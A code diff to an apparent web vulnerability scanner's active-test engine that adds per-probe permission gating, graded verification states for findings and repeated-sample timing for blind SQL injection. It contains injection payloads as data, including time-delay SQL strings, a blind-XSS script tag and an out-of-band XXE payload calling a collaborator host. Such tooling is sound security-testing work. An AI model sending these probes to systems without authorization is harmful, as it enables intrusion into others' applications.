@@ -79,6 +79,7 @@ final class ActiveTestEngine {
             "'; SELECT PG_SLEEP(5)-- -",     // PostgreSQL
             "'; WAITFOR DELAY '0:0:5'-- -"); // MSSQL
     private static final int SQLI_TIME_DELAY_SECONDS = 5;
+    private static final int SQLI_TIMING_SAMPLES = 3;
 
     // NoSQL injection: values that break a Mongo-style query or its $where JavaScript so the datastore
     // surfaces a parser/driver error. Detection is error-based and baseline-differenced (like SQLi) —
@@ -146,6 +147,8 @@ final class ActiveTestEngine {
     private final ThreadLocal<ScanRun> scanRun = new ThreadLocal<>();
     private final ThreadLocal<ActiveRequestGateway> requestGateway = new ThreadLocal<>();
     private final ThreadLocal<String> currentProbeId = ThreadLocal.withInitial(() -> "active-probe");
+    private final ThreadLocal<Set<RequestPolicy.Permission>> currentProbePermissions =
+            ThreadLocal.withInitial(Set::of);
     private final ThreadLocal<Boolean> lastRequestDispatched = ThreadLocal.withInitial(() -> false);
     private volatile CollaboratorClient collaborator;
 
@@ -155,33 +158,6 @@ final class ActiveTestEngine {
     }
 
     void setCollaborator(CollaboratorClient collaborator) { this.collaborator = collaborator; }
-
-    /** Runs safe-method probes against every non-cookie parameter of {@code base}. */
-    List<ActiveFinding> test(HttpRequest base, int maxRequests) {
-        return test(base, maxRequests, false);
-    }
-
-    /**
-     * Compatibility entry point for tests and callers that do not yet own a first-class run.
-     * New orchestration should create one {@link ScanRun} for the whole pass and call
-     * {@link #test(HttpRequest, ScanRun, ActiveRequestGateway)} so all targets share one budget.
-     */
-    List<ActiveFinding> test(HttpRequest base, int maxRequests, boolean allowMutating) {
-        if (base == null || maxRequests <= 0) return List.of();
-        if (!allowMutating && !isSafeMethod(base)) return List.of();
-        ScanProfile profile = allowMutating ? ScanProfile.ACTIVE_MUTATION : ScanProfile.ACTIVE_SAFE;
-        ScanRun run = ScanRun.begin(profile, ScopeSnapshot.forTargetUrl(base.url()), maxRequests);
-        Set<RequestPolicy.Permission> permissions = allowMutating
-                ? EnumSet.of(RequestPolicy.Permission.UNSAFE_HTTP_METHOD, RequestPolicy.Permission.STATE_CHANGING)
-                : Set.of();
-        ActiveRequestGateway gateway = new ActiveRequestGateway(
-                new RequestPolicy(api.scope()::isInScope, permissions), api.http()::sendRequest);
-        try {
-            return test(base, run, gateway);
-        } finally {
-            if (run.isRunning()) run.complete();
-        }
-    }
 
     /**
      * Executes probes inside a caller-owned run. Every request in every target handled by the caller
@@ -208,25 +184,32 @@ final class ActiveTestEngine {
                 }
                 if (!budgetExhausted()) runProbe("reflected-xss", () -> testReflectedXss(base, point, findings));
                 if (!budgetExhausted()) runProbe("ssti", () -> testSsti(base, point, findings));
-                if (!budgetExhausted()) runProbe("ssrf", () -> testSsrf(base, point, findings));
-                if (!budgetExhausted()) runProbe("blind-xss", () -> testBlindXss(base, point, findings));
-                if (!budgetExhausted()) runProbe("command-injection", () -> testCommandInjection(base, point, findings));
+                if (!budgetExhausted()) runProbe("ssrf", Set.of(RequestPolicy.Permission.OAST),
+                        () -> testSsrf(base, point, findings));
+                if (!budgetExhausted()) runProbe("blind-xss", Set.of(RequestPolicy.Permission.OAST, RequestPolicy.Permission.PERSISTENT_PAYLOAD),
+                        () -> testBlindXss(base, point, findings));
+                if (!budgetExhausted()) runProbe("command-injection", Set.of(RequestPolicy.Permission.OAST),
+                        () -> testCommandInjection(base, point, findings));
                 if (!budgetExhausted()) runProbe("open-redirect", () -> testOpenRedirect(base, point, findings));
                 if (!budgetExhausted()) runProbe("crlf", () -> testCrlf(base, point, findings));
                 if (!budgetExhausted()) runProbe("sqli", () -> testSqli(base, point, findings));
                 if (!budgetExhausted()) runProbe("nosqli", () -> testNoSqlInjection(base, point, findings));
                 if (!budgetExhausted()) runProbe("path-traversal", () -> testPathTraversal(base, point, findings));
             }
-            if (!budgetExhausted()) runProbe("host-header", () -> testHostHeaderInjection(base, findings));
+            if (!budgetExhausted()) runProbe("host-header", Set.of(RequestPolicy.Permission.OAST),
+                    () -> testHostHeaderInjection(base, findings));
             if (!budgetExhausted()) runProbe("cors", () -> testCors(base, findings));
-            if (!budgetExhausted()) runProbe("rate-limit", () -> testRateLimit(base, findings));
-            if (!budgetExhausted()) runProbe("file-upload", () -> testFileUploadBypass(base, findings));
+            if (!budgetExhausted()) runProbe("rate-limit", Set.of(RequestPolicy.Permission.AUTHENTICATION_OR_LOCKOUT),
+                    () -> testRateLimit(base, findings));
+            if (!budgetExhausted()) runProbe("file-upload", Set.of(RequestPolicy.Permission.UPLOAD),
+                    () -> testFileUploadBypass(base, findings));
             if (!budgetExhausted()) runProbe("xxe", () -> testXxe(base, findings));
             return findings;
         } finally {
             scanRun.remove();
             requestGateway.remove();
             currentProbeId.remove();
+            currentProbePermissions.remove();
             lastRequestDispatched.remove();
         }
     }
@@ -237,7 +220,7 @@ final class ActiveTestEngine {
         Optional<String> waf = fingerprintWaf(response.statusCode(),
                 response.bodyToString(), response.headerValue("Server"));
         waf.ifPresent(vendor -> out.add(new ActiveFinding("INFO", "WAF", point.label(),
-                "Likely WAF/filter: " + vendor + " (status " + response.statusCode() + ")", true, base.url())));
+                "Likely WAF/filter: " + vendor + " (status " + response.statusCode() + ")", VerificationState.CANDIDATE, base.url())));
         return 1;
     }
 
@@ -249,7 +232,7 @@ final class ActiveTestEngine {
         if (!surviving.isEmpty()) {
             String severity = (surviving.contains("<") && surviving.contains(">")) ? "HIGH" : "MEDIUM";
             out.add(new ActiveFinding(severity, "XSS", point.label(),
-                    "Reflected metacharacters survived unencoded: " + surviving, true, base.url()));
+                    "Reflected metacharacters survived unencoded: " + surviving, VerificationState.CANDIDATE, base.url()));
         }
         return 1;
     }
@@ -265,7 +248,7 @@ final class ActiveTestEngine {
             if (engine.isPresent()) {
                 out.add(new ActiveFinding("HIGH", "SSTI", point.label(),
                         "Template arithmetic evaluated (" + SSTI_A + "*" + SSTI_B + "=" + SSTI_PRODUCT
-                                + ") via " + engine.get(), true, base.url()));
+                                + ") via " + engine.get(), VerificationState.CONFIRMED, base.url()));
                 break;
             }
         }
@@ -281,10 +264,10 @@ final class ActiveTestEngine {
         if (!Boolean.TRUE.equals(lastRequestDispatched.get())) return 0;
         if (response != null && response.bodyToString().contains(payload.toString())) {
             out.add(new ActiveFinding("HIGH", "SSRF", point.label(),
-                    "Collaborator host reflected in response (probable full-response SSRF)", true, base.url()));
+                    "Collaborator host reflected in response (possible SSRF/reflection signal)", VerificationState.CANDIDATE, base.url()));
         } else {
             out.add(new ActiveFinding("INFO", "SSRF", point.label(),
-                    "Collaborator SSRF payload sent; awaiting OOB interaction", false, base.url()));
+                    "Collaborator SSRF payload sent; awaiting OOB interaction", VerificationState.SIGNAL, base.url()));
         }
         return 1;
     }
@@ -297,7 +280,7 @@ final class ActiveTestEngine {
         sendMutated(base, point, "\"><script src=//" + payload + "></script>");
         if (!Boolean.TRUE.equals(lastRequestDispatched.get())) return 0;
         out.add(new ActiveFinding("INFO", "XSS-blind", point.label(),
-                "Blind-XSS beacon sent; awaiting OOB interaction", false, base.url()));
+                "Blind-XSS beacon sent; awaiting OOB interaction", VerificationState.SIGNAL, base.url()));
         return 1;
     }
 
@@ -314,7 +297,7 @@ final class ActiveTestEngine {
         int sent = budgetUsed() - before;
         if (sent > 0) {
             out.add(new ActiveFinding("INFO", "CMDi", point.label(),
-                    "Blind command-injection DNS probes sent; awaiting OOB interaction", false, base.url()));
+                    "Blind command-injection DNS probes sent; awaiting OOB interaction", VerificationState.SIGNAL, base.url()));
         }
         return sent;
     }
@@ -325,7 +308,7 @@ final class ActiveTestEngine {
         if (response == null) return 1;
         Optional<String> hit = detectOpenRedirect(response.statusCode(), response.headerValue("Location"), marker);
         hit.ifPresent(location -> out.add(new ActiveFinding("MEDIUM", "OpenRedirect", point.label(),
-                "Redirect Location points to attacker-controlled host: " + location, true, base.url())));
+                "Redirect Location points to attacker-controlled host: " + location, VerificationState.CONFIRMED, base.url())));
         return 1;
     }
 
@@ -334,7 +317,7 @@ final class ActiveTestEngine {
         HttpResponse response = sendMutated(base, point, injected);
         if (response != null && response.headerValue("X-Recon-Hound") != null) {
             out.add(new ActiveFinding("HIGH", "CRLF", point.label(),
-                    "Injected CRLF produced a new response header (X-Recon-Hound)", true, base.url()));
+                    "Injected CRLF produced a new response header (X-Recon-Hound)", VerificationState.CONFIRMED, base.url()));
         }
         return 1;
     }
@@ -350,7 +333,7 @@ final class ActiveTestEngine {
         if (errorResponse != null && containsSqlError(errorResponse.bodyToString()) && !containsSqlError(baselineBody)) {
             out.add(new ActiveFinding("HIGH", "SQLi", point.label(),
                     "Injecting a single quote produced a database error signature not present in the baseline response",
-                    true, base.url()));
+                    VerificationState.REPRODUCED, base.url()));
             return budgetUsed() - before;
         }
         if (budgetExhausted()) return budgetUsed() - before;
@@ -362,19 +345,30 @@ final class ActiveTestEngine {
                 && looksBooleanBased(baselineBody, trueResponse.bodyToString(), falseResponse.bodyToString())) {
             out.add(new ActiveFinding("HIGH", "SQLi", point.label(),
                     "Boolean-based blind: the always-true condition matches the baseline response while the "
-                            + "always-false condition diverges from both", true, base.url()));
+                            + "always-false condition diverges from both", VerificationState.REPRODUCED, base.url()));
             return budgetUsed() - before;
         }
         if (budgetExhausted()) return budgetUsed() - before;
 
-        long baselineMillis = timeRequest(base, point, point.baseValue());
+        List<Long> baselineTimings = timingSamples(base, point, point.baseValue(), SQLI_TIMING_SAMPLES);
+        if (baselineTimings.size() < SQLI_TIMING_SAMPLES) return budgetUsed() - before;
         for (String payload : SQLI_TIME_PAYLOADS) {
             if (budgetExhausted()) break;
-            long payloadMillis = timeRequest(base, point, payload);
-            if (looksTimeBased(baselineMillis, payloadMillis, SQLI_TIME_DELAY_SECONDS)) {
+            List<Long> payloadTimings = timingSamples(base, point, payload, SQLI_TIMING_SAMPLES);
+            if (payloadTimings.size() < SQLI_TIMING_SAMPLES) break;
+
+            ResponseComparator.TimingAnalysis timing = ResponseComparator.analyzeTiming(
+                    baselineTimings, payloadTimings, SQLI_TIME_DELAY_SECONDS * 1000L);
+            if (timing.delayed()) {
                 out.add(new ActiveFinding("HIGH", "SQLi", point.label(),
-                        "Time-based blind: response time increased by ~" + SQLI_TIME_DELAY_SECONDS
-                                + "s in response to payload " + payload, true, base.url()));
+                        "Repeated time-based blind signal for payload " + payload
+                                + ": baseline median=" + timing.baselineMedianMillis() + "ms"
+                                + " (MAD=" + timing.baselineMadMillis() + "ms), payload median="
+                                + timing.payloadMedianMillis() + "ms (MAD=" + timing.payloadMadMillis()
+                                + "ms), delta=" + timing.medianDeltaMillis() + "ms across "
+                                + timing.consistentDelayedSamples() + "/" + payloadTimings.size()
+                                + " consistently delayed samples",
+                        VerificationState.REPRODUCED, base.url()));
                 break;
             }
         }
@@ -399,7 +393,7 @@ final class ActiveTestEngine {
             if (containsNoSqlError(response.bodyToString())) {
                 out.add(new ActiveFinding("HIGH", "NoSQLi", point.label(),
                         "Injecting " + payload + " produced a NoSQL datastore error signature not present "
-                                + "in the baseline response", true, base.url()));
+                                + "in the baseline response", VerificationState.REPRODUCED, base.url()));
                 break;
             }
         }
@@ -425,7 +419,7 @@ final class ActiveTestEngine {
             if (hit.isPresent()) {
                 out.add(new ActiveFinding("HIGH", "PathTraversal", point.label(),
                         "Traversal payload returned " + hit.get() + " that was absent from the baseline "
-                                + "response (payload: " + payload + ")", true, base.url()));
+                                + "response (payload: " + payload + ")", VerificationState.CONFIRMED, base.url()));
                 break;
             }
         }
@@ -434,8 +428,19 @@ final class ActiveTestEngine {
 
     private long timeRequest(HttpRequest base, InsertionPoint point, String value) {
         long start = System.currentTimeMillis();
-        sendMutated(base, point, value);
-        return System.currentTimeMillis() - start;
+        sendMutated(base, point, value, Set.of(RequestPolicy.Permission.TIME_DELAY));
+        return Boolean.TRUE.equals(lastRequestDispatched.get())
+                ? System.currentTimeMillis() - start : -1;
+    }
+
+    private List<Long> timingSamples(HttpRequest base, InsertionPoint point, String value, int count) {
+        List<Long> samples = new ArrayList<>(count);
+        for (int i = 0; i < count && !budgetExhausted(); i++) {
+            long millis = timeRequest(base, point, value);
+            if (millis < 0) break;
+            samples.add(millis);
+        }
+        return samples;
     }
 
     /**
@@ -463,7 +468,7 @@ final class ActiveTestEngine {
             if (hit.isPresent()) {
                 out.add(new ActiveFinding("HIGH", "XXE", "(request body)",
                         "In-band XXE: an external entity returned " + hit.get() + " that was absent from "
-                                + "the baseline response", true, base.url()));
+                                + "the baseline response", VerificationState.CONFIRMED, base.url()));
                 return budgetUsed() - before;
             }
         }
@@ -472,11 +477,12 @@ final class ActiveTestEngine {
         if (client != null && !budgetExhausted()) {
             String correlation = encodeCorrelation("XXE", "(body)", base.url());
             CollaboratorPayload payload = client.generatePayload(correlation);
-            HttpResponse response = sendBody(base, XxeEngine.buildOobPayload("http://" + payload + "/xxe"));
+            HttpResponse response = sendBody(base, XxeEngine.buildOobPayload("http://" + payload + "/xxe"),
+                    Set.of(RequestPolicy.Permission.OAST));
             if (response != null) {
                 out.add(new ActiveFinding("INFO", "XXE", "(request body)",
                         "External-entity OOB payload sent to " + payload + "; awaiting Collaborator callback",
-                        false, base.url()));
+                        VerificationState.SIGNAL, base.url()));
             }
         }
         return budgetUsed() - before;
@@ -484,8 +490,12 @@ final class ActiveTestEngine {
 
     /** Sends {@code base} with its body replaced by {@code body}, through the scope/budget gate. */
     private HttpResponse sendBody(HttpRequest base, String body) {
+        return sendBody(base, body, Set.of());
+    }
+
+    private HttpResponse sendBody(HttpRequest base, String body, Set<RequestPolicy.Permission> permissions) {
         try {
-            HttpRequestResponse rr = sendRequest(base.withBody(body));
+            HttpRequestResponse rr = sendRequest(base.withBody(body), permissions);
             return rr == null ? null : rr.response();
         } catch (Exception e) {
             api.logging().logToError("XXE probe failed for " + base.url(), e);
@@ -502,7 +512,7 @@ final class ActiveTestEngine {
             HttpRequestResponse rr = sendRequest(base.withUpdatedHeader("X-Forwarded-Host", payload.toString()));
             if (rr == null) return 0;
             out.add(new ActiveFinding("INFO", "HostHeader", "X-Forwarded-Host",
-                    "X-Forwarded-Host set to Collaborator host; awaiting OOB (reset-poisoning/cache)", false, base.url()));
+                    "X-Forwarded-Host set to Collaborator host; awaiting OOB (reset-poisoning/cache)", VerificationState.SIGNAL, base.url()));
         } catch (Exception e) {
             api.logging().logToError("Host-header probe failed", e);
         }
@@ -532,7 +542,7 @@ final class ActiveTestEngine {
                     out.add(new ActiveFinding(credentials ? "HIGH" : "MEDIUM", "CORS", "Origin",
                             "Server reflected a " + kind + " in Access-Control-Allow-Origin"
                                     + (credentials ? " with Allow-Credentials:true — full cross-origin credentialed read." : "."),
-                            true, base.url()));
+                            VerificationState.CONFIRMED, base.url()));
                 }
             } catch (Exception e) {
                 api.logging().logToError("CORS probe failed for " + base.url(), e);
@@ -573,7 +583,7 @@ final class ActiveTestEngine {
             out.add(new ActiveFinding("MEDIUM", "RateLimit", "burst",
                     statuses.size() + " consecutive identical requests to a sensitive-looking endpoint all "
                             + "succeeded with no rate-limit signal (no 429/503, Retry-After header, or lockout "
-                            + "wording) observed", true, base.url()));
+                            + "wording) observed", VerificationState.SIGNAL, base.url()));
         }
         return budgetUsed() - before;
     }
@@ -612,7 +622,8 @@ final class ActiveTestEngine {
                         out.add(new ActiveFinding(stored.isPresent() ? "HIGH" : "MEDIUM", "FileUpload", file.partName(),
                                 "Renamed upload \"" + file.filename() + "\" -> \"" + variant + "\" was accepted (status "
                                         + status + ")" + stored.map(p -> "; stored at " + p).orElse(""),
-                                stored.isPresent(), base.url()));
+                                stored.isPresent() ? VerificationState.REPRODUCED : VerificationState.SIGNAL,
+                                base.url()));
                         if (stored.isPresent()) break; // strongest possible signal for this file already found
                     }
                 } catch (Exception e) {
@@ -624,18 +635,31 @@ final class ActiveTestEngine {
     }
 
     private void runProbe(String probeId, Runnable probe) {
-        String previous = currentProbeId.get();
+        runProbe(probeId, Set.of(), probe);
+    }
+
+    private void runProbe(String probeId, Set<RequestPolicy.Permission> permissions, Runnable probe) {
+        String previousId = currentProbeId.get();
+        Set<RequestPolicy.Permission> previousPermissions = currentProbePermissions.get();
         currentProbeId.set(probeId == null || probeId.isBlank() ? "active-probe" : probeId);
+        currentProbePermissions.set(permissions == null || permissions.isEmpty()
+                ? Set.of() : Set.copyOf(permissions));
         try {
             probe.run();
         } finally {
-            currentProbeId.set(previous);
+            currentProbeId.set(previousId);
+            currentProbePermissions.set(previousPermissions);
         }
     }
 
     private HttpResponse sendMutated(HttpRequest base, InsertionPoint point, String value) {
+        return sendMutated(base, point, value, Set.of());
+    }
+
+    private HttpResponse sendMutated(HttpRequest base, InsertionPoint point, String value,
+                                     Set<RequestPolicy.Permission> permissions) {
         try {
-            HttpRequestResponse rr = sendRequest(point.apply(base, value));
+            HttpRequestResponse rr = sendRequest(point.apply(base, value), permissions);
             return rr == null ? null : rr.response();
         } catch (Exception e) {
             api.logging().logToError("Active probe failed for " + point.label(), e);
@@ -648,16 +672,27 @@ final class ActiveTestEngine {
      * cancellation, and the one run-scoped budget are all enforced by {@link ActiveRequestGateway}.
      */
     private HttpRequestResponse sendRequest(HttpRequest request) {
+        return sendRequest(request, Set.of());
+    }
+
+    private HttpRequestResponse sendRequest(HttpRequest request, Set<RequestPolicy.Permission> extraPermissions) {
         lastRequestDispatched.set(false);
         if (request == null) return null;
         ScanRun run = scanRun.get();
         ActiveRequestGateway gateway = requestGateway.get();
         if (run == null || gateway == null || !run.isRunning()) return null;
-        Set<RequestPolicy.Permission> permissions = isSafeMethod(request)
-                ? Set.of()
-                : EnumSet.of(RequestPolicy.Permission.UNSAFE_HTTP_METHOD, RequestPolicy.Permission.STATE_CHANGING);
+
+        EnumSet<RequestPolicy.Permission> permissions = EnumSet.noneOf(RequestPolicy.Permission.class);
+        Set<RequestPolicy.Permission> probePermissions = currentProbePermissions.get();
+        if (probePermissions != null) permissions.addAll(probePermissions);
+        if (extraPermissions != null) permissions.addAll(extraPermissions);
+        if (!isSafeMethod(request)) {
+            permissions.add(RequestPolicy.Permission.UNSAFE_HTTP_METHOD);
+            permissions.add(RequestPolicy.Permission.STATE_CHANGING);
+        }
+
         ActiveRequestGateway.Result result = gateway.send(run,
-                new RequestPolicy.PlannedRequest(request.method(), request.url(), currentProbeId.get(), permissions),
+                RequestPlan.create(request, currentProbeId.get(), permissions),
                 request);
         if (result.error() != null) {
             api.logging().logToError("Active request failed for " + request.url(), result.error());
@@ -808,11 +843,7 @@ final class ActiveTestEngine {
 
     /** Two response bodies are "the same page" if identical, or within ~1% (min 5 chars) in length. */
     static boolean closeEnough(String a, String b) {
-        if (a == null || b == null) return false;
-        if (a.equals(b)) return true;
-        int diff = Math.abs(a.length() - b.length());
-        int tolerance = Math.max(5, Math.max(a.length(), b.length()) / 100);
-        return diff <= tolerance;
+        return ResponseComparator.samePage(a, b);
     }
 
     /** Time-based blind confirmation: the payload response took at least ~{@code delaySeconds} longer. */
